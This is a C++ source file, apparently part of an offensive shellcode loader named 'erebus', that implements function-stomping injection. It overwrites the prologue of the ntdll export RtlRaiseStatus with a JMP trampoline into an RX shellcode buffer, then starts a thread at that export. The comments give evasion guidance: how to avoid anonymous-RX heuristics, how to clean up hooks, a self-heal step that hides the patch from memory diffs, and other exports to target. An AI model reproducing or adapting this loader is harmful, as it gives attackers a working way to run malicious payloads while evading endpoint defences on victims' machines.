// Function Stomping / Threadless Injection - CONFIG_INJECTION_TYPE == 11
//
// OPSEC profile:
//   Shellcode is written over the prologue of a rarely-called ntdll export
//   (RtlRaiseStatus). Execution is triggered by creating a thread that starts
//   at the stomped export rather than at a freshly-allocated RX region.
//
//   Evasion benefit: no new RW->RX allocation visible in the VAD. The shellcode
//   execution vector appears as a call into ntdll, which is a file-backed image
//   section and does not trigger "anonymous RX region" heuristics.
//
//   Detection surface:
//     NtProtectVirtualMemory on an ntdll page (RX -> RW -> RX flip)
//     NtCreateThreadEx with start address inside ntdll (unusual but not impossible)
//     Memory hash/diff of ntdll on disk vs. in-process post-stomp
//
//   Hardening: pair with CONFIG_UNHOOK_SCOPE 3 (selective per-function restore)
//   to clean hooks before the stomp, reducing false-positive unhooking signals.
//   The shellcode's first instruction should restore the original prologue bytes
//   so a live diff after execution shows a clean ntdll.
//
//   Self-injection: CONFIG_INJECTION_MODE 2 - process_handle and thread_handle
//   from the caller are unused (this technique injects into the current process).
//
// MALLEABLE: swap RtlRaiseStatus for any ntdll export that is:
//   (a) rarely called in steady-state, (b) present on all target OS versions,
//   (c) short enough that the 14-byte trampoline does not spill into the next
//   export's prologue. Good candidates: RtlSetHeapInformation, RtlRunOnceInitialize.

#include "../../include/loader.hpp"

namespace erebus {
#if CONFIG_INJECTION_TYPE == 11

    // 14-byte absolute JMP trampoline:
    //   FF 25 00 00 00 00       JMP QWORD PTR [RIP+0]
    //   <8-byte target address>
    static constexpr SIZE_T TRAMPOLINE_SIZE = 14;

    static void _BuildTrampoline(BYTE* buf, PVOID target)
    {
        buf[0] = 0xFF; buf[1] = 0x25;
        buf[2] = 0x00; buf[3] = 0x00; buf[4] = 0x00; buf[5] = 0x00;
        *(PVOID*)(buf + 6) = target;
    }

    VOID InjectionFunctionStomp(IN BYTE* shellcode, IN SIZE_T shellcode_size,
                                IN HANDLE /*process_handle*/, IN HANDLE /*thread_handle*/)
    {
        LOG_INFO("Injection via Function Stomping (T1055, threadless variant)");

        HMODULE ntdll = ImportModule("ntdll.dll");
        if (!ntdll) { LOG_ERROR("Failed to get ntdll.dll"); return; }

        ImportFunction(ntdll, NtAllocateVirtualMemory, typeNtAllocateVirtualMemory);
        ImportFunction(ntdll, NtProtectVirtualMemory,  typeNtProtectVirtualMemory);
        ImportFunction(ntdll, NtCreateThreadEx,        typeNtCreateThreadEx);
        ImportFunction(ntdll, NtWriteVirtualMemory,    typeNtWriteVirtualMemory);
        ImportFunction(ntdll, NtClose,                 typeNtClose);

        if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory ||
            !NtCreateThreadEx        || !NtWriteVirtualMemory   || !NtClose)
        {
            LOG_ERROR("Failed to resolve NT functions");
            return;
        }

        // Step 1: Allocate RW shellcode buffer in the current process.
        // This allocation is private (anonymous) and will be flipped to RX.
        PVOID sc_base = NULL;
        SIZE_T sc_size = shellcode_size;
        NTSTATUS status = NtAllocateVirtualMemory(
            (HANDLE)(LONG_PTR)-1,
            &sc_base,
            0,
            &sc_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        if (!NT_SUCCESS(status)) {
            LOG_ERROR("NtAllocateVirtualMemory failed (NTSTATUS: 0x%08X)", status);
            return;
        }

        RtlCopyMemory(sc_base, shellcode, shellcode_size);

        // Prepend original-prologue restore bytes inside the shellcode:
        // Operator's shellcode should begin with a 14-byte NOP sled OR the builder
        // should prepend a self-heal stub that writes the saved_bytes back to the
        // export address. Without this, ntdll is permanently patched for the
        // process lifetime - acceptable for short-lived loaders, noisy for beacons.

        PVOID protect_base = sc_base;
        SIZE_T protect_size = sc_size;
        ULONG old_prot = 0;
        status = NtProtectVirtualMemory(
            (HANDLE)(LONG_PTR)-1,
            &protect_base,
            &protect_size,
            PAGE_EXECUTE_READ,
            &old_prot
        );
        if (!NT_SUCCESS(status)) {
            LOG_ERROR("NtProtectVirtualMemory (RX) failed (NTSTATUS: 0x%08X)", status);
            return;
        }
        LOG_SUCCESS("Shellcode buffer RX at: 0x%p", sc_base);

        // Step 2: Resolve the stomp target export.
        // RtlRaiseStatus is an ntdll export that is never called in steady-state
        // user-mode execution. It is always present (NT 5.0+) and its prologue
        // fits a 14-byte in-place trampoline without stomping into adjacent exports.
        // [MALLEABLE] swap for any other ntdll export matching the criteria above.
        PVOID stomp_addr = erebus::GetProcAddressC(ntdll, H("RtlRaiseStatus"));
        if (!stomp_addr) {
            LOG_ERROR("Failed to resolve RtlRaiseStatus in ntdll");
            return;
        }
        LOG_INFO("Stomp target: RtlRaiseStatus @ 0x%p", stomp_addr);

        // Step 3: Save original prologue bytes for potential self-heal by shellcode.
        BYTE saved_bytes[TRAMPOLINE_SIZE] = {};
        SIZE_T read_len = 0;
        {
            // NtReadVirtualMemory not imported here; direct memcpy from local address space.
            RtlCopyMemory(saved_bytes, stomp_addr, TRAMPOLINE_SIZE);
        }

        // Step 4: Flip the export page to RW so we can write the trampoline.
        PVOID page_base  = stomp_addr;
        SIZE_T page_size = TRAMPOLINE_SIZE;
        ULONG old_export_prot = 0;
        status = NtProtectVirtualMemory(
            (HANDLE)(LONG_PTR)-1,
            &page_base,
            &page_size,
            PAGE_READWRITE,
            &old_export_prot
        );
        if (!NT_SUCCESS(status)) {
            LOG_ERROR("NtProtectVirtualMemory (stomp RW) failed (NTSTATUS: 0x%08X)", status);
            return;
        }

        // Step 5: Write the 14-byte absolute JMP trampoline at the export prologue.
        BYTE trampoline[TRAMPOLINE_SIZE];
        _BuildTrampoline(trampoline, sc_base);
        RtlCopyMemory(stomp_addr, trampoline, TRAMPOLINE_SIZE);

        // Restore export page to original protection (typically PAGE_EXECUTE_READ).
        NtProtectVirtualMemory(
            (HANDLE)(LONG_PTR)-1,
            &page_base,
            &page_size,
            old_export_prot,
            &old_export_prot
        );
        LOG_SUCCESS("Trampoline written at RtlRaiseStatus; page restored to 0x%lX", old_export_prot);

        // Step 6: Create a thread at the stomped export address.
        // The thread entry appears to be inside ntdll (RtlRaiseStatus RVA),
        // which blends with legitimate ntdll worker threads.
        HANDLE thread_h = NULL;
        status = NtCreateThreadEx(
            &thread_h,
            THREAD_ALL_ACCESS,
            NULL,
            (HANDLE)(LONG_PTR)-1,
            stomp_addr,
            NULL,
            FALSE,
            0,
            0,
            0,
            NULL
        );
        if (!NT_SUCCESS(status)) {
            LOG_ERROR("NtCreateThreadEx failed (NTSTATUS: 0x%08X)", status);
            return;
        }

        LOG_SUCCESS("Thread created at stomped export 0x%p (handle: 0x%p)", stomp_addr, thread_h);
        NtClose(thread_h);
        LOG_SUCCESS("Injection Complete!");
    }

#endif
} // namespace erebus
